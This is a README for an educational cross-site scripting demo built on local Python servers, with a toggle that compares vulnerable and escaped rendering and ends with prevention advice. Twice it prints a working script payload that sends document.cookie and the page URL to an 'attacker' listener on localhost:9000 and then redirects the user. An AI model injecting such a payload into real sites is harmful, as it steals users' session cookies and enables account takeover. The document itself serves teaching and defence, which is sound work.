# XSS Attack Demonstration Project

## Overview
This project demonstrates how a **Cross-Site Scripting (XSS)** attack works using a simple Python HTTP server.  

It includes:
- A vulnerable web page that reflects unescaped user input.  
- A malicious script that steals cookies and redirects users.  
- A landing page served by a local listener to visualize the redirection.  

The goal is to help demonstrate how unsanitized input leads to script injection and how to prevent it.

---

## Technical Principle
**XSS (Cross-Site Scripting)** occurs when user input is inserted into a web page without proper escaping or validation.  

In this demo:
- The attacker injects a `<script>` payload into a vulnerable web page.  
- The script sends sensitive information (like cookies or URL data) to the attacker's server (here simulated on `localhost:9000`).  
- The user is then redirected to a landing page served by the same listener.  

The core mechanism is:

```html
<script>
(function(){
  var ATTACKER = "http://localhost:9000";
  var info = "u=" + encodeURIComponent(location.href) + "&c=" + encodeURIComponent(document.cookie || "");
  var img = new Image();
  img.src = ATTACKER + "/steal?" + info + "&_t=" + Date.now();
  setTimeout(function(){ location.replace(ATTACKER + "/landing.html"); }, 300);
})();
</script>
```
## XSS Protection Toggle

To better demonstrate the difference between a **vulnerable** and a **protected** system,  **XSS Protection Toggle** has been introduced to the Post Discussion form.

When enabled, the server will escape HTML special characters and prevent the injected scripts from executing.

In this enhanced demo:

- The user can choose whether to enable basic XSS protection.
- When protection is **ON**, user input such as `<script>` is escaped on the server side.
- When protection is **OFF**, the input is stored and rendered as-is, allowing full Stored XSS demonstration.
- This allows a clear comparison between a vulnerable workflow and a protected workflow.

### Example Behavior

When **Protection OFF**, the following payload executes normally:

```html
<script>alert("Hacked!")</script>
```

When **Protection ON**, it is safely displayed as text:
```html
&lt;script&gt;alert("Hacked!")&lt;/script&gt;
```
The protection mechanism works by performing server-side output encoding, converting HTML control characters into safe textual entities so that the browser interprets the user input as plain text instead of executable JavaScript.

## How to Run

### 1. Start the local listener
Run the Python receiver (`toy_receiver.py`):

```bash
python3 toy_receiver.py
```

It listens on port **9000** and provides:
- `/steal` — to log stolen data.  
- `/landing.html` — to display the landing page.  

### 2. Start the vulnerable web server
Open a **new terminal window** and run:

```bash
python3 vulnerable_server.py
```

This server hosts the vulnerable web page that allows XSS injection.

---

### 3. Open the vulnerable page
In your browser, visit the vulnerable HTML page ('http://localhost:8000/') that accepts unescaped input.  
Try injecting:

```html
<script>
(function(){
  var ATTACKER = "http://localhost:9000";
  var info = "u=" + encodeURIComponent(location.href) + "&c=" + encodeURIComponent(document.cookie || "");
  var img = new Image();
  img.src = ATTACKER + "/steal?" + info + "&_t=" + Date.now();
  setTimeout(function(){ location.replace(ATTACKER + "/landing.html"); }, 300);
})();
</script>
```

---

### 4. Observe the result
- The listener console will show incoming `/steal` requests (simulating stolen data).  
- The browser will be redirected to the **Landing Page (Demo)**.

---

## Restoring the Page
To recover the web page to its **original, unpolluted state**:

1. Remove any injected `<script>` tags or suspicious HTML content from database（./data/posts.json）.  
2. Refresh the page — it should now load normally without redirection.  
3. *(Optional)* Clear browser cache and cookies if previous attacks stored any data.  

For long-term protection:
- Sanitize all user inputs.  
- Encode dynamic output before inserting into HTML.  
- Use a **Content Security Policy (CSP)** to restrict scripts.  

